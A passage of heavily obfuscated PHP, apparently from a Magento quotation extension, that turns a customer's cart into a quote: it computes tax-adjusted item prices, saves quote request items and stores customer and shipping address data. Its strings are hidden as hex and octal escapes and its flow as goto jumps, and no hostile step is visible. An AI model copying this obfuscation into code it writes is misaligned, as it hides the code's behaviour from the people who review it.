Mage::getModel("\x63\165\163\164\157\x6d\x65\x72\x2f\x67\x72\x6f\x75\160")->getTaxClassId($McJRc); goto ob0x7; JmkBC: $sPCw3 = $VpbLO->addCustomerAddress($EY6wb, $DfAxy->exportCustomerAddress()->getData()); goto Y3_iK; Kvqiz: $EY6wb = $OLseV->getCustomer()->getId(); goto TN_sS; yYHga: iX6e9: goto L456R; W1b40: $b2ZYX = Mage::getStoreConfig("\x71\161\165\x6f\164\145\x61\x64\x76\137\161\x75\x6f\x74\145\x5f\143\157\x6e\146\151\x67\x75\162\x61\x74\151\157\156\57\160\162\157\x70\x6f\x73\x61\154\x2f\x69\164\145\155\x70\162\x69\x63\145") == 563/563 ? 802/802 : 0; goto EhUBL; aQbTR: $dbQ0c = ["\163\x68\x69\160\x70\x69\x6e\x67\137\x61\155\x6f\165\x6e\x74" => "\x73\x68\151\x70\x70\x69\156\147\137\x61\155\x6f\x75\156\164", "\142\x61\163\145\137\163\x68\x69\160\x70\151\x6e\147\x5f\x61\x6d\x6f\165\156\x74" => "\142\141\x73\145\x5f\x73\x68\151\160\x70\x69\156\147\137\141\155\x6f\x75\x6e\x74", "\x73\x68\x69\x70\160\x69\156\147\137\x61\x6d\x6f\x75\156\x74\137\151\x6e\x63\154\137\x74\141\170" => "\x73\150\x69\160\x70\151\x6e\x67\x5f\x61\155\x6f\x75\x6e\x74\x5f\x69\x6e\143\154\137\x74\x61\x78", "\x62\x61\x73\145\x5f\163\x68\x69\160\x70\151\156\x67\137\x61\155\157\x75\x6e\164\137\x69\156\143\154\137\164\141\170" => "\142\141\x73\x65\x5f\163\150\x69\160\x70\x69\x6e\x67\x5f\x61\x6d\x6f\x75\x6e\x74\137\x69\156\143\154\137\164\141\x78", "\142\141\163\145\x5f\163\150\x69\x70\160\151\x6e\x67\x5f\x74\x61\x78\x5f\x61\x6d\157\165\x6e\164" => "\x62\x61\x73\x65\137\163\150\x69\160\x70\151\x6e\147\137\x74\x61\170\x5f\141\x6d\157\x75\156\164", "\163\x68\x69\x70\x70\151\156\x67\137\x74\141\170\x5f\x61\155\157\165\156\164" => "\x73\x68\151\x70\160\x69\x6e\x67\x5f\164\141\170\x5f\x61\155\157\x75\x6e\164", "\x61\144\144\162\x65\163\163\x5f\163\x68\151\x70\x70\x69\156\x67\137\x6d\145\x74\x68\x6f\x64" => "\163\150\151\x70\x70\151\156\x67\137\x6d\x65\164\150\x6f\x64", "\x61\x64\x64\162\145\x73\x73\137\163\150\x69\160\x70\x69\156\x67\137\x64\145\x73\143\162\x69\160\164\x69\x6f\x6e" => "\163\150\151\160\x70\x69\x6e\x67\137\x64\145\x73\143\x72\x69\x70\164\151\157\x6e"]; goto GFH2L; uJxgc: vOWzo: goto eBSPf; EhQT0: foreach ($qLNg0->getStreet() as $LgtKY) { goto ZW4xG; cyb0h: JaWFs: goto Cq9Ae; ZW4xG: if (!($LgtKY != '')) { goto x2q_i; } goto SIycY; F7j88: x2q_i: goto cyb0h; SIycY: $x09Vf = true; goto F7j88; Cq9Ae: } goto vQLZq; nklnM: $V63Tj = Mage::getSingleton("\141\144\x6d\x69\156\x2f\x73\x65\163\x73\151\157\156"); goto W1b40; AJ9Sc: Mage::dispatchEvent("\157\x70\x68\x69\162\141\x68\x5f\161\161\x75\x6f\x74\x65\x61\x64\x76\x5f\x61\x64\x6d\x69\x6e\x5f\163\167\151\x74\150\x32\x51\165\157\164\x65\x5f\141\x66\164\145\x72", [$MYXly, $OLseV, $xOx3u]); goto wdVgl; IRtK0: cP1Er: goto UI6CG; jAHzZ: foreach ($OLseV->getAllVisibleItems() as $QbRw5) { goto QGmao; DtM60: $R6f9I = $OJXHM->getRate($iXSSh->setProductClassId($SeGNy)); goto X1qCd; d7XWD: $wAPVw->setOriginalCurPrice($prfoz); goto Zzcg7; Ye3yL: $OJXHM = Mage::getModel("\164\x61\x78\x2f\143\141\x6c\143\165\x6c\141\x74\151\x6f\156"); goto reAhL; vG2kB: oD0XN: goto WA_Sq; r5Ple: $QbRw5->setNoDiscount(236/236); goto fXRC7; Pa3Qt: if ($GeZ43) { goto L8VgD; } goto TXDgz; zr6U1: $sqmnD = max($n10fj->getIdsByQuoteId($MYXly)); goto hICYp; PC4UL: $prfoz = $oVsTX * $dC40_; goto KCOwd; eLEo0: $HEnaw = Mage::getModel("\x71\161\x75\x6f\x74\145\x61\144\x76\57\162\145\161\x75\145\x73\x74\151\x74\x65\x6d")->getCollection()->addFieldToFilter("\161\165\x6f\164\145\137\x69\x64", $feYQc->getQuoteId())->addFieldToFilter("\160\x72\x6f\x64\x75\143\164\137\x69\x64", $feYQc->getProductId())->addFieldToFilter("\x72\x65\x71\x75\145\163\x74\137\x71\x74\171", $feYQc->getQty()); goto W1kDh; wwiHY: $wAPVw->setOriginalPrice($oVsTX); goto d7XWD; vUS0N: $XcukT = null; goto H5V1C; DzpzQ: $QbRw5->setNoDiscount(0); goto T1Xbi; viPyQ: $NL9ym = $QbRw5->getBasePrice() * $dC40_; goto I0PKD; PkgqX: if ($QbRw5->getProduct()->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE && $QbRw5->getProduct()->getPriceType() == 0) { goto FJGV3; } goto viPyQ; pmpFr: ye4do: goto vG2kB; kHxd5: UUM3A: goto v1dvO; Unef0: $ONoXp["\x71\164\171"] = $QbRw5->getQty(); goto KzslD; H5V1C: if (!$OLseV->getCustomerTaxClassId()) { goto Uy42R; } goto Y3Fl4; SvR23: if ($eU1uM) { goto HdapI; } goto JsdVa; zqBQ3: $zGo11 = $zGo11 / (38800/388 + $Wzzul) * (60500/605 + $XZ0ur); goto qenQO; ERCZn: DrDqW: goto DzpzQ; NRU4_: hA_Pr: goto SW3Ny; yDRoj: GCHlW: goto gH4A1; I0PKD: goto mcXhN; goto kHxd5; yzeIR: if (!$GeZ43) { goto pw37H; } goto qBs7m; KWJgK: goto mcXhN; goto SDf0e; EkVcn: if (!(isset($NL9ym) && !empty($NL9ym))) { goto kHzBQ; } goto w8Udk; O_rk1: U8TBS: goto d6dlo; hICYp: $glYn3[] .= $sqmnD; goto Bh8Q5; jO0Ol: $FYPRK = $IZwBM; goto NsNZi; MSLv7: $Wzzul = $R6f9I; goto iBQ1h; nnnmm: $R6f9I = 0; goto hwn9G; ydM06: $feYQc = Mage::getModel("\161\x71\x75\157\x74\145\x61\x64\166\x2f\x71\161\141\x64\x76\x70\162\x6f\x64\x75\x63\164")->load($eU1uM); goto PVvy4; qsoM1: $Ni1CG = ''; goto ffda3; iqz8L: try { goto RzTey; rm0q4: Mage::dispatchEvent("\157\160\x68\151\x72\141\x68\137\x71\161\165\x6f\x74\145\141\x64\166\x5f\141\144\x6d\x69\x6e\137\x73\167\151\164\x68\62\121\165\157\x74\145\137\165\x70\144\141\164\145\x5f\x71\x71\x61\x64\166\x70\x72\157\144\x75\x63\x74\x5f\x73\141\166\x65\137\x61\x66\x74\145\x72\137\163\x75\x63\143\145\x73\163", ["\x71\x75\157\164\x65\137\151\164\x65\155" => $QbRw5, "\x71\161\141\144\166\x63\165\163\164\157\x6d\x65\x72\x5f\151\144" => $MYXly, "\x71\x71\x61\x64\x76\x70\162\x6f\144\x75\143\164" => $feYQc]); goto hTRo0; RzTey: Mage::dispatchEvent("\x6f\x70\150\151\162\x61\x68\137\x71\x71\x75\x6f\164\x65\x61\x64\x76\x5f\141\144\155\x69\156\x5f\163\167\151\164\150\x32\121\x75\157\x74\145\x5f\165\x70\x64\x61\x74\145\137\x71\161\141\x64\x76\160\x72\x6f\144\165\143\x74\137\x73\x61\x76\145\x5f\142\x65\146\157\x72\145", ["\x71\x75\157\164\145\137\x69\x74\145\x6d" => $QbRw5, "\x71\161\x61\x64\166\143\x75\163\x74\157\x6d\145\x72\137\x69\144" => $MYXly, "\x71\161\x61\x64\x76\160\162\x6f\x64\x75\x63\164" => $feYQc]); goto wMVzV; wMVzV: $feYQc->save(); goto rm0q4; hTRo0: } catch (Exception $Zf0h2) { Mage::log("\105\170\143\x65\x70\x74\x69\157\156\x3a\40" . $Zf0h2->getMessage(), null, "\x63\x32\161\137\145\x78\143\x65\x70\x74\151\157\156\56\154\157\x67", true); Mage::dispatchEvent("\x6f\x70\x68\x69\x72\141\150\x5f\161\x71\x75\157\164\145\x61\144\x76\137\x61\144\155\x69\156\137\163\x77\x69\164\150\62\121\165\x6f\x74\x65\137\165\160\x64\x61\164\x65\x5f\x71\161\x61\144\x76\160\162\x6f\144\x75\143\164\x5f\163\141\166\x65\x5f\x61\146\164\145\162\x5f\x66\x61\x69\x6c", ["\161\x75\157\164\x65\x5f\151\164\x65\x6d" => $QbRw5, "\x71\x71\141\x64\x76\143\165\163\x74\157\155\x65\162\x5f\151\x64" => $MYXly, "\161\161\x61\144\x76\160\x72\157\x64\165\x63\164" => $feYQc, "\145\x78\x63\x65\x70\164\151\x6f\156" => $Zf0h2]); } goto psJoQ; pG11z: if (!isset($r8x28["\x69\x6e\x66\157\137\142\165\171\x52\x65\161\x75\145\163\164"])) { goto FC9o_; } goto K0vPG; Pd2Yz: $feYQc->setQty($QbRw5->getQty()); goto H23_L; G12uW: $r8x28["\151\156\146\157\137\142\165\171\x52\x65\161\165\x65\163\x74"]["\161\164\x79"] = $QbRw5->getQty(); goto MXsXq; DCmlp: $XZ0ur = 0; goto UXkOD; IfK9T: pw37H: goto Y0aFo; gH4A1: $eU1uM = $n10fj->getIdByQuoteAndProduct($QbRw5, $MYXly); goto SvR23; hG3c2: $ONoXp = unserialize($feYQc->getAttribute()); goto Yws52; AOwBv: $feYQc->setHasOption(775/775); goto SdVOw; bR2B1: eTIcR: goto SdJQ5; TMzBO: $oVsTX = $FYPRK; goto PC4UL; PVvy4: Mage::dispatchEvent("\x6f\160\150\151\162\x61\x68\x5f\161\161\x75\157\x74\145\141\x64\166\137\141\144\155\x69\x6e\x5f\x73\x77\151\x74\150\62\121\x75\x6f\164\145\x5f\x75\x70\144\141\164\145\137\x71\x71\x61\144\x76\x70\x72\x6f\144\165\x63\x74\137\x62\145\x66\157\x72\x65", ["\x71\x75\x6f\x74\145\x5f\x69\164\145\155" => $QbRw5, "\x71\161\141\x64\x76\143\165\x73\x74\157\x6d\145\162\137\x69\144" => $MYXly, "\x71\x71\141\144\x76\x70\x72\157\144\x75\143\x74" => $feYQc]); goto eLEo0; b1FtJ: try { goto Q7Cn2; BTCP3: Mage::dispatchEvent("\157\160\150\151\x72\x61\x68\137\161\x71\x75\x6f\164\x65\141\144\166\x5f\x61\144\x6d\x69\156\137\163\x77\151\164\x68\62\x51\165\157\x74\x65\x5f\165\160\x64\141\164\x65\137\x72\x65\x71\x75\145\x73\x74\151\x74\145\x6d\x5f\163\141\166\145\137\141\x66\x74\x65\162\137\163\x75\143\143\x65\x73\x73", ["\161\x75\157\164\145\137\x69\x74\145\x6d" => $QbRw5, "\161\x71\141\144\166\143\165\x73\164\x6f\x6d\x65\x72\137\x69\x64" => $MYXly, "\161\x71\x61\144\x76\160\x72\157\x64\165\x63\164" => $feYQc]); goto la446; JVFNo: $wAPVw->save(); goto BTCP3; Q7Cn2: Mage::dispatchEvent("\157\x70\x68\151\x72\141\150\x5f\161\161\165\x6f\164\x65\141\x64\x76\x5f\141\144\155\151\156\x5f\163\167\x69\x74\x68\x32\121\x75\x6f\x74\145\x5f\165\160\144\141\x74\x65\137\162\x65\x71\x75\x65\163\164\151\164\145\155\x5f\163\141\166\x65\137\x62\x65\146\x6f\x72\x65", ["\161\165\x6f\164\x65\x5f\151\x74\145\x6d" => $QbRw5, "\161\x71\x61\x64\166\x63\x75\163\164\157\x6d\145\162\x5f\x69\144" => $MYXly, "\161\161\x61\x64\166\160\x72\x6f\x64\x75\143\164" => $feYQc]); goto JVFNo; la446: } catch (Exception $Zf0h2) { Mage::log("\x45\170\x63\145\x70\164\151\x6f\156\72\x20" . $Zf0h2->getMessage(), null, "\x63\62\161\137\x65\x78\143\x65\160\x74\151\157\156\x2e\154\157\147", true); Mage::dispatchEvent("\x6f\x70\150\x69\162\x61\150\x5f\161\161\165\x6f\164\145\x61\x64\166\137\141\x64\x6d\151\156\137\163\x77\151\164\150\x32\x51\165\x6f\164\x65\137\x75\160\x64\141\164\145\x5f\162\x65\x71\165\x65\163\x74\151\164\145\155\x5f\163\x61\166\145\x5f\x61\146\164\x65\162\x5f\x66\141\151\154", ["\161\165\157\164\145\137\x69\164\145\x6d" => $QbRw5, "\161\x71\x61\144\166\x63\165\163\164\157\x6d\x65\x72\x5f\151\144" => $MYXly, "\x71\x71\x61\x64\166\160\x72\157\x64\165\x63\164" => $feYQc, "\145\x78\x63\145\x70\164\x69\157\x6e" => $Zf0h2]); } goto bJEt2; YLKVE: $Za98d = true; goto zqBQ3; OxKIO: goto wr3SG; goto B1uR9; SdJQ5: $BhWOR = ["\x70\x72\157\144\x75\x63\164\137\x69\x64" => $QbRw5->getProductId(), "\161\x74\171" => $QbRw5->getQty(), "\160\x72\x69\x63\x65" => $IZwBM, "\143\165\163\x74\x6f\155\x5f\160\162\151\x63\145" => $NL9ym, "\157\x72\151\147\x69\156\141\x6c\x5f\x70\x72\x69\x63\145" => $FYPRK, "\142\141\163\145\x5f\x71\165\x6f\164\145\x5f\x72\141\x74\145" => $dC40_, "\x75\x73\145\x5f\144\151\163\x63\x6f\x75\156\164" => $uPBdc]; goto FeJpS; NsNZi: OMNha: goto KZ5iV; KVTHB: goto oD0XN; goto dkBBG; d6dlo: $IZwBM = $QbRw5->getPrice(); goto pmpFr; Kv9M6: if ($QbRw5->getProduct()->getPriceType() == 0) { goto U8TBS; } goto CVJPl; Llp8g: $NL9ym = $QbRw5->getPrice() * $dC40_; goto VoO7l; iBQ1h: Uy42R: goto wug1M; C81xF: Mage::dispatchEvent("\157\160\x68\x69\x72\141\x68\x5f\161\x71\165\x6f\x74\145\x61\144\x76\137\x61\x64\x6d\x69\156\x5f\x73\167\151\164\150\x32\121\x75\157\x74\x65\x5f\x75\x70\x64\x61\164\145\x5f\x71\161\x61\x64\x76\x70\162\157\x64\x75\x63\x74\137\141\146\164\145\162", ["\x71\x75\x6f\164\x65\x5f\151\164\x65\x6d" => $QbRw5, "\161\x71\x61\144\x76\143\x75\163\164\x6f\155\x65\x72\x5f\151\144" => $MYXly, "\161\x71\141\144\166\x70\162\157\144\165\143\x74" => $feYQc]); goto WH3fp; LKLw2: F3_0e: goto xTHW3; bwPGT: $FYPRK = Mage::getModel("\x62\165\156\x64\154\x65\x2f\x70\162\x6f\x64\x75\143\x74\x5f\160\162\x69\x63\145")->getFinalPrice(996/996, $QbRw5->getProduct()); goto x3TvH; bd8cD: goto OMNha; goto Cvk75; R6mLY: HdapI: goto ydM06; YyrIp: $c3RCn = $QbRw5->getProduct(); goto x1w2v; b2V4D: unset($r8x28["\x69\156\x66\x6f\x5f\142\x75\x79\122\x65\161\165\x65\163\x74"]["\165\145\156\x63"]); goto PMbjf; qUd6t: $Z7k9w = 1060/530; goto JcAq3; BnJw6: kHzBQ: goto TMzBO; jY1at: if (!isset($r8x28["\157\x70\x74\x69\x6f\x6e\163"])) { goto tfZD0; } goto k6rms; K0vPG: if (!isset($r8x28["\x69\x6e\146\157\x5f\x62\x75\171\122\x65\161\x75\x65\163\x74"]["\163\165\x70\x65\x72\x5f\x61\164\164\x72\x69\142\x75\164\145"])) { goto hA_Pr; } goto ovoMH; rL60D: if (Mage::getStoreConfig("\161\x71\165\157\x74\x65\x61\x64\x76\137\141\x64\x76\141\156\143\x65\x64\137\x73\145\164\x74\151\x6e\x67\163\57\x62\141\x63\153\145\156\144\57\x66\x6f\162\x63\x65\x5f\x6f\162\x69\x67\151\x6e\141\154\x5f\x70\162\x6f\144\x75\143\x74\x5f\x70\x72\151\143\x65")) { goto SAR9v; } goto rTKu0; ovoMH: $ONoXp["\x73\165\x70\145\162\137\x61\164\164\162\x69\x62\165\164\145"] = $r8x28["\x69\156\146\x6f\x5f\142\x75\171\122\145\x71\x75\x65\x73\x74"]["\163\165\x70\x65\162\x5f\x61\x74\x74\162\x69\142\165\164\145"]; goto NRU4_; Cvk75: ugAqG: goto jO0Ol; k6rms: $feYQc->setOptions(serialize($r8x28["\157\x70\164\x69\157\156\163"])); goto AOwBv; Yws52: $r8x28 = $QbRw5->getProduct()->getTypeInstance(true)->getOrderOptions($QbRw5->getProduct()); goto pG11z; IMft4: $SeGNy = $c3RCn->getTaxClassId(); goto DtM60; qenQO: bsi4j: goto IfK9T; H23_L: $feYQc->setUseDiscount($uPBdc); goto iqz8L; AYT9N: $iXSSh = $OJXHM->getRateOriginRequest($OLseV->getStore()); goto IMft4; EwHZi: $R6f9I = $OJXHM->getRate($Gl1O0->setProductClassId($SeGNy)); goto MSLv7; WH3fp: $glYn3[] .= $eU1uM; goto vsOz2; bJEt2: VprMs: goto C81xF; VoO7l: mcXhN: goto qUd6t; w8Udk: $IZwBM = $NL9ym; goto BnJw6; WV0lO: wr3SG: goto rtsbn; jvWZw: $FYPRK = $IZwBM; goto UnuYe; VZnx1: $NL9ym = $QbRw5->getOriginalCustomPrice(); goto WV0lO; DwEbo: L8VgD: goto rL60D; JGWAY: $zGo11 = $QbRw5->getBasePriceInclTax(); goto yzeIR; Ju__d: d4PR2: goto BuMHK; BjQkU: eqFmj: goto KVTHB; X1qCd: $XZ0ur = $R6f9I; goto vUS0N; wug1M: if (!($XZ0ur != $Wzzul)) { goto bsi4j; } goto YLKVE; dkBBG: g0mMP: goto bwPGT; kGOEw: goto ye4do; goto zYoMS; SDf0e: FJGV3: goto Llp8g; fXRC7: $uPBdc = 0; goto mSnHr; SW3Ny: FC9o_: goto jY1at; Y0aFo: if ($QbRw5->getProduct()->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE) { goto g0mMP; } goto cxABe; B1uR9: P9Uk_: goto VZnx1; QXr_n: if (!$ZXeg2) { goto fLVXZ; } goto qPOpA; UnuYe: RXGbI: goto BjQkU; ffda3: if (!isset($r8x28["\x69\x6e\146\x6f\137\x62\x75\x79\x52\x65\x71\x75\x65\x73\164"])) { goto eTIcR; } goto IIpQr; WA_Sq: if ($QbRw5->getOriginalCustomPrice()) { goto P9Uk_; } goto S0GpY; JcAq3: $NL9ym = round($NL9ym, $Z7k9w); goto OxKIO; mSnHr: goto GCHlW; goto ERCZn; TgEEQ: $r8x28["\151\x6e\x66\x6f\x5f\x62\165\x79\122\145\x71\x75\145\163\164"]["\160\x72\x6f\144\165\143\164"] = $QbRw5->getData("\160\162\x6f\x64\x75\143\164\x5f\151\144"); goto G12uW; QGmao: Mage::dispatchEvent("\x6f\160\150\151\162\141\x68\x5f\161\x71\x75\157\164\x65\141\x64\166\137\141\144\155\151\156\137\x73\x77\x69\x74\150\x32\x51\165\157\164\145\x5f\x61\x64\144\x69\x74\x65\x6d\137\x62\145\146\157\x72\x65", ["\161\165\x6f\164\145\x5f\151\x74\145\155" => $QbRw5, "\x71\161\141\144\166\x63\x75\x73\x74\x6f\x6d\145\x72\137\151\144" => $MYXly]); goto YyrIp; yfBCd: $IZwBM = $zGo11; goto yHtps; MXsXq: $Ni1CG = serialize($r8x28["\x69\156\x66\157\137\x62\165\171\122\x65\x71\x75\145\x73\164"]); goto bR2B1; SdVOw: tfZD0: goto Unef0; UXkOD: $Wzzul = 0; goto nnnmm; KzslD: $feYQc->setAttribute(serialize($ONoXp)); goto Pd2Yz; S0GpY: if ($GeZ43) { goto UUM3A; } goto PkgqX; IIpQr: if (!isset($r8x28["\x69\x6e\146\157\x5f\x62\165\171\122\x65\x71\165\x65\163\164"]["\165\x65\x6e\x63"])) { goto yoWFM; } goto b2V4D; hwn9G: $Za98d = false; goto JGWAY; CVJPl: $IZwBM = $QbRw5->getBasePrice(); goto kGOEw; TXDgz: if (Mage::getStoreConfig("\161\161\x75\x6f\164\145\x61\x64\x76\137\141\x64\166\x61\x6e\143\145\x64\137\163\145\164\164\151\x6e\x67\163\x2f\x62\x61\143\x6b\145\x6e\144\x2f\x66\x6f\x72\x63\145\137\157\162\x69\x67\x69\156\x61\x6c\x5f\160\x72\x6f\144\x75\143\x74\137\160\162\151\x63\x65")) { goto ugAqG; } goto bhhA6; rtsbn: $ZkDTt = $NL9ym / $dC40_; goto EkVcn; vsOz2: GVcP2: goto rcq1U; psJoQ: $wAPVw->setOwnerBasePrice($ZkDTt); goto sAf7f; bhhA6: $FYPRK = $QbRw5->getBasePrice(); goto bd8cD; xTHW3: $wAPVw = $HEnaw->getFirstItem(); goto cnzwu; v1dvO: $NL9ym = $zGo11 * $dC40_; goto KWJgK; FeJpS: $feYQc = $this->xUwkg($BhWOR, $Ni1CG); goto zr6U1; KCOwd: if ($QbRw5->getBaseDiscountAmount() > 0) { goto DrDqW; } goto r5Ple; cxABe: $IZwBM = $c3RCn->getPrice(); goto Pa3Qt; kfVxy: $EHpPI[] = $wAPVw->getId(); goto hG3c2; Bh8Q5: goto GVcP2; goto R6mLY; KZ5iV: goto eqFmj; goto DwEbo; zYoMS: wkbt3: goto yfBCd; Y3Fl4: $Gl1O0 = $OJXHM->getRateRequest($OLseV->getShippingAddress(), $OLseV->getBillingAddress(), $OLseV->getCustomerTaxClassId(), $OLseV->getStore()); goto EwHZi; rcq1U: Mage::dispatchEvent("\157\160\150\151\162\x61\150\137\x71\161\x75\x6f\x74\x65\x61\144\x76\x5f\x61\144\x6d\x69\156\x5f\163\x77\151\x74\x68\x32\x51\165\157\164\x65\x5f\141\x64\144\x69\164\x65\x6d\x5f\x61\x66\164\x65\162", ["\x71\x75\x6f\164\x65\137\x69\x74\145\x6d" => $QbRw5, "\161\x71\141\144\x76\x63\x75\x73\x74\157\155\x65\162\x5f\151\144" => $MYXly, "\x71\x71\141\144\x76\x70\x72\157\144\165\x63\x74" => $feYQc]); goto Ju__d; qPOpA: $OJXHM->setCustomer($ZXeg2); goto X23tP; PMbjf: yoWFM: goto TgEEQ; yHtps: goto ye4do; goto O_rk1; uhsqH: goto RXGbI; goto p6IOn; x1w2v: $GeZ43 = Mage::helper("\164\141\170")->priceIncludesTax($OLseV->getStoreId()); goto DCmlp; JsdVa: $r8x28 = $QbRw5->getProduct()->getTypeInstance(true)->getOrderOptions($QbRw5->getProduct()); goto qsoM1; Zzcg7: $wAPVw->setRequestQty($QbRw5->getQty()); goto b1FtJ; X23tP: fLVXZ: goto AYT9N; p6IOn: SAR9v: goto jvWZw; W1kDh: foreach ($EHpPI as $UuSHa) { $HEnaw->addFieldToFilter("\x72\145\161\165\x65\163\x74\137\151\144", ["\x6e\x65\x71" => $UuSHa]); H0ubq: } goto LKLw2; x3TvH: if ($GeZ43) { goto wkbt3; } goto Kv9M6; T1Xbi: $uPBdc = 450/450; goto yDRoj; cnzwu: if (!$wAPVw->getId()) { goto VprMs; } goto kfVxy; reAhL: $ZXeg2 = $OLseV->getCustomer(); goto QXr_n; sAf7f: $wAPVw->setOwnerCurPrice($IZwBM); goto wwiHY; rTKu0: $FYPRK = $zGo11; goto uhsqH; qBs7m: $c3RCn = Mage::getModel("\x63\x61\x74\x61\x6c\x6f\x67\x2f\160\x72\157\x64\x75\x63\164")->setStoreId($OLseV->getStoreId())->load($QbRw5->getProduct()->getId()); goto Ye3yL; BuMHK: } goto ukGbE; y74Q8: return; goto wmMZd; CNzk8: if (Mage::getStoreConfig("\161\x71\165\x6f\164\x65\x61\144\x76\137\147\x65\156\x65\162\x61\154\57\x71\x75\157\x74\x61\x74\151\157\156\x73\57\x65\156\x61\x62\x6c\x65\144", $OLseV->getStoreId())) { goto QQTki; } goto uEgyg; V9gsu: $this->getCustomerSession()->setQuoteadvId($MYXly); goto oZYFZ; uG3QN: if (!array_key_exists("\x6f\162\144\x65\162", $xOx3u)) { goto AY2pV; } goto TPYqK; RXdb7: r1odb: goto hZbnW; yydcg: $VpbLO = Mage::helper("\x71\161\165\157\164\x65\141\x64\166\x2f\x61\x64\x64\162\145\163\163"); goto Rb0Oh; N1pvU: $HYkyg[] = $this->__("\x54\150\x65\162\x65\40\167\141\163\40\x61\x6e\x20\145\x72\162\157\x72\54\40\x62\x65\143\141\165\163\x65\x20\164\150\145\40\143\165\x73\x74\157\x6d\x65\162\40\x61\x64\x64\x72\x65\163\x73\x20\x77\x61\163\x20\x75\156\144\145\x66\x69\x6e\x65\144"); goto Bxvjv; OYRwi: $VpbLO->updateCustomerAddress($EY6wb, $wL2m8, $qLNg0->exportCustomerAddress()->getData()); goto UtXbV; VEEn5: if (!$x09Vf) { goto focPe; } goto Z3Qvf; Djf_x: return; goto yp9kj; cMOi1: $DfAxy->setCustomerAddressId($f6WCT); goto g30Mc; aCUXZ: mSdxZ: goto OgL3T; rBMHX: $HYkyg[] = $this->__("\103\165\x73\164\x6f\x6d\x65\x72\40\156\157\164\x20\x72\x65\x63\x6f\x67\156\x69\x7a\x65\144\x20\x66\x6f\162\x20\156\x65\167\40\x71\x75\157\164\x65"); goto IRtK0; Y1F20: VFdp6: goto Gmt_A; KNSS7: $YygQt = ["\143\x72\145\x61\164\x65\144\x5f\x61\x74" => now(), "\x75\160\x64\141\x74\145\144\x5f\x61\164" => now(), "\x63\x75\x73\164\157\x6d\145\162\x5f\x69\x64" => $EY6wb, "\x63\x75\162\162\x65\156\143\x79" => $aMYKO, "\x62\x61\163\145\137\x74\x6f\x5f\161\165\x6f\164\x65\x5f\x72\141\x74\145" => $dC40_, "\160\162\x65\146\151\x78" => $qLNg0->getPrefix(), "\146\151\x72\x73\x74\156\x61\155\x65" => $qLNg0->getFirstname(), "\155\x69\x64\x64\x6c\x65\x6e\x61\x6d\145" => $qLNg0->getMiddlename(), "\154\x61\x73\164\x6e\141\155\x65" => $qLNg0->getLastname(), "\163\165\146\x66\151\x78" => $qLNg0->getSuffix(), "\x63\157\x6d\160\141\x6e\x79" => $qLNg0->getCompany(), "\145\x6d\141\151\154" => $lcvw3, "\143\x6f\x75\156\164\x72\x79\x5f\x69\x64" => $qLNg0->getCountryId(), "\162\145\147\x69\157\x6e" => $qLNg0->getRegion(), "\x72\145\x67\151\157\x6e\x5f\x69\x64" => $qLNg0->getRegionId(), "\x63\151\164\x79" => $qLNg0->getCity(), "\141\x64\x64\x72\145\x73\163" => $Qgehk, "\x70\x6f\x73\x74\x63\x6f\144\x65" => $qLNg0->getPostcode(), "\x74\145\154\145\160\x68\x6f\156\145" => $qLNg0->getTelephone(), "\146\141\x78" => $qLNg0->getFax(), "\x73\x74\x6f\x72\x65\x5f\151\144" => $OLseV->getStoreId(), "\x69\164\145\155\x70\x72\x69\143\145" => $b2ZYX, "\x63\165\x73\x74\x6f\x6d\x65\162\x5f\x61\144\x64\162\145\163\x73\x5f\151\x64" => $QMteD, "\x76\x61\x74\137\x69\x64" => $qLNg0->getData("\x76\x61\164\137\x69\144"), "\x76\141\x74\x5f\x69\163\x5f\x76\141\154\151\x64" => $qLNg0->getData("\166\141\164\x5f\x69\163\137\x76\x61\x6c\x69\144"), "\x76\x61\x74\137\x72\145\161\165\145\163\x74\137\x69\x64" => $qLNg0->getData("\x76\141\164\x5f\x72\x65\161\x75\x65\163\164\137\x69\x64"), "\166\141\164\x5f\162\x65\x71\165\x65\x73\164\x5f\x64\141\x74\x61" => $qLNg0->getData("\x76\x61\x74\x5f\162\145\x71\x75\145\x73\164\137\144\141\x74\x61"), "\166\x61\x74\137\x72\145\x71\165\145\x73\x74\137\x73\x75\x63\143\145\163\163" => $qLNg0->getData("\166\141\x74\x5f\x72\145\x71\x75\145\x73\x74\x5f\x73\x75\x63\143\145\x73\x73"), "\163\x68\x69\x70\160\151\x6e\x67\137\x70\162\145\x66\151\x78" => $DfAxy->getData("\x70\x72\x65\146\x69\170"), "\163\x68\151\x70\x70\151\156\147\x5f\x66\x69\162\163\x74\156\x61\155\145" => $DfAxy->getData("\146\151\x72\163\164\x6e\141\155\145"), "\x73\150\151\160\160\x69\156\x67\x5f\x6d\151\x64\x64\154\x65\156\141\x6d\145" => $DfAxy->getData("\155\151\x64\x64\x6c\145\x6e\141\155\x65"), "\x73\150\x69\160\160\151\x6e\147\x5f\154\x61\163\x74\x6e\141\155\145" => $DfAxy->getData("\154\141\163\164\x6e\141\x6d\145"), "\x73\x68\151\160\x70\x69\x6e\147\137\163\x75\146\146\x69\x78" => $DfAxy->getData("\x73\x75\146\x66\x69\170"), "\x73\150\151\x70\160\151\156\x67\137\x63\x6f\155\x70\x61\x6e\x79" => $DfAxy->getData("\143\157\x6d\160\x61\156\171"), "\x73\x68\151\x70\x70\151\156\x67\137\x63\x6f\x75\156\164\162\171\x5f\x69\x64" => $DfAxy->getData("\x63\x6f\x75\x6e\164\162\171\x5f\151\x64"), "\x73\x68\x69\x70\x70\151\x6e\x67\137\x72\145\x67\151\x6f\156" => $DfAxy->getData("\162\145\147\151\157\x6e"), "\x73\150\x69\x70\160\151\156\147\x5f\162\145\147\151\x6f\156\x5f\151\144" => $DfAxy->getData("\162\145\147\x69\157\x6e\x5f\x69\144"), "\163\x68\x69\x70\x70\x69\x6e\147\137\143\x69\164\171" => $DfAxy->getData("\143\151\x74\171"), "\163\150\151\160\x70\151\x6e\147\137\141\x64\x64\162\x65\163\x73" => $fPGQT, "\x73\150\151\160\x70\151\x6e\x67\137\x70\x6f\163\164\x63\x6f\144\x65" => $DfAxy->getData("\x70\x6f\x73\164\143\157\x64\145"), "\x73\150\151\x70\160\151\x6e\x67\137\x74\145\154\145\160\150\157\156\x65" => $DfAxy->getData("\x74\145\154\x65\160\x68\157\x6e\x65"), "\x73\x68\151\160\160\151\x6e\147\137\146\x61\x78" => $DfAxy->getData("\146\x61\170"), "\x73\150\x69\160\160\x69\156\x67\137\166\141\x74\x5f\x69\x64" => $DfAxy->getData("\x76\x61\x74\137\151\144"), 